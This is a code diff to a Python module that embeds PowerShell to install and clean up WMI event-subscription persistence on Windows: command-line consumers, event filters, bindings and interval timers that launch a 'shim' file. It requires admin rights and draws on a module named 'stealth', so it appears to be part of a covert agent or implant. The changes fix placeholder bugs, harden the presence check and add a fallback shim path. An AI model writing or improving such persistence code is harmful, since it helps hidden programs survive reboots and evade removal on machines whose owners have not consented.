@@ -84,9 +84,9 @@ try {
 Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
     Where-Object { $_.Consumer -like "*@@CONSUMER@@" } |
     Remove-WmiObject -ErrorAction SilentlyContinue
-Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -Filter "Name='@@CONSUMER@'" -ErrorAction SilentlyContinue |
+Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -Filter "Name='@@CONSUMER@@'" -ErrorAction SilentlyContinue |
     Remove-WmiObject -ErrorAction SilentlyContinue
-Get-WmiObject -Namespace $ns -Class __EventFilter -Filter "Name='@@FILTER@'" -ErrorAction SilentlyContinue |
+Get-WmiObject -Namespace $ns -Class __EventFilter -Filter "Name='@@FILTER@@'" -ErrorAction SilentlyContinue |
     Remove-WmiObject -ErrorAction SilentlyContinue
 
 $filter = Set-WmiInstance -Namespace $ns -Class __EventFilter -Arguments @{
@@ -114,11 +114,11 @@ $ns = 'root\subscription'
 Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
     Where-Object { $_.Consumer -like "*@@CONSUMER@@" } |
     Remove-WmiObject -ErrorAction SilentlyContinue
-Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -Filter "Name='@@CONSUMER@'" -ErrorAction SilentlyContinue |
+Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -Filter "Name='@@CONSUMER@@'" -ErrorAction SilentlyContinue |
     Remove-WmiObject -ErrorAction SilentlyContinue
-Get-WmiObject -Namespace $ns -Class __EventFilter -Filter "Name='@@FILTER@'" -ErrorAction SilentlyContinue |
+Get-WmiObject -Namespace $ns -Class __EventFilter -Filter "Name='@@FILTER@@'" -ErrorAction SilentlyContinue |
     Remove-WmiObject -ErrorAction SilentlyContinue
-Get-WmiObject -Namespace $ns -Class __IntervalTimerInstruction -Filter "TimerID='@@TIMER@'" -ErrorAction SilentlyContinue |
+Get-WmiObject -Namespace $ns -Class __IntervalTimerInstruction -Filter "TimerID='@@TIMER@@'" -ErrorAction SilentlyContinue |
     Remove-WmiObject -ErrorAction SilentlyContinue
 'ok'
 '''
@@ -147,7 +147,12 @@ def consumer_present() -> bool:
         return False
     code, out = _ps(_QUERY_PS, timeout=45)
     _last_wmi_check = time.time()
-    return code == 0 and out.strip().splitlines()[-1:][0:1] == ["1"]
+    if code != 0:
+        return False
+    try:
+        return int(out.strip().splitlines()[-1]) > 0
+    except (ValueError, IndexError):
+        return False
 
 
 def install() -> list[str]:
@@ -155,7 +160,9 @@ def install() -> list[str]:
     if not IS_WINDOWS or not is_admin():
         return []
     from .agent import stealth
-    shim = stealth.shim_path()
+    shim = stealth.anchor_shim_path()
+    if not os.path.isfile(shim):
+        shim = stealth.shim_path()
     if not os.path.isfile(shim):
         return []
     code, out = _ps(_fill(_INSTALL_PS, shim), timeout=120)
